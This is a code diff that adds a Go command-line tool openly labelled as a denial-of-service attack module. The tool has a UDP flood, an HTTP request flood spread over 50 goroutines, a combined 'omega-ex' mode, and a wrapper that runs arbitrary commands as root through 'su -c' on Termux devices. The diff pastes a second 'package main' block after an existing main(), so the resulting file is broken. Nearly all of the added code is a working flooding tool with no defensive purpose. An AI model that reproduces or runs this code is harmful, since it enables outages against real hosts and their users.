@@ -143,3 +143,79 @@ func main() {
 		fmt.Printf("[L-SYSTEM] Unknown: %s\n", command)
 	}
 }
+package main
+
+import (
+	"fmt"
+	"net"
+	"net/http"
+	"os"
+	"os/exec"
+	"strings"
+	"time"
+)
+
+// --- MÓDULO DE ATAQUE (DoS) ---
+func udpFlood(target string) {
+	addr, _ := net.ResolveUDPAddr("udp", target+":80")
+	conn, _ := net.DialUDP("udp", nil, addr)
+	payload := make([]byte, 1024)
+	for { conn.Write(payload) }
+}
+
+func lDrain(target string) {
+	for i := 0; i < 50; i++ {
+		go func() {
+			for {
+				resp, err := http.Get("http://" + target)
+				if err == nil { resp.Body.Close() }
+			}
+		}()
+	}
+}
+
+// --- MÓDULO LINUX/TERMUX ---
+func systemExec(isRoot bool, name string, args []string) {
+	var cmd *exec.Cmd
+	if isRoot {
+		// Ejecuta vía 'su' para dispositivos con Root
+		fullCmd := name + " " + strings.Join(args, " ")
+		cmd = exec.Command("su", "-c", fullCmd)
+	} else {
+		// Ejecuta usando el binario de busybox o nmap que estará en la app
+		cmd = exec.Command(name, args...)
+	}
+	out, err := cmd.CombinedOutput()
+	if err != nil { fmt.Printf("[L-ERROR] %v\n", err) }
+	fmt.Print(string(out))
+}
+
+func main() {
+	if len(os.Args) < 2 { return }
+	command := os.Args[1]
+
+	switch command {
+	case "flood":
+		if len(os.Args) < 3 { return }
+		go udpFlood(os.Args[2])
+		select {}
+
+	case "omega-ex":
+		if len(os.Args) < 3 { return }
+		go udpFlood(os.Args[2])
+		go lDrain(os.Args[2])
+		fmt.Println("[L] PROTOCOL OMEGA-EX: ACTIVE")
+		select {}
+
+	case "nmap", "whois", "ping", "ifconfig":
+		// Redirige estos comandos al binario interno 'busybox' o 'nmap'
+		systemExec(false, "busybox", os.Args[1:])
+
+	case "root-exec":
+		if len(os.Args) < 3 { return }
+		systemExec(true, os.Args[2], os.Args[3:])
+
+	default:
+		fmt.Printf("[L-SYSTEM] Unknown: %s\n", command)
+	}
+}
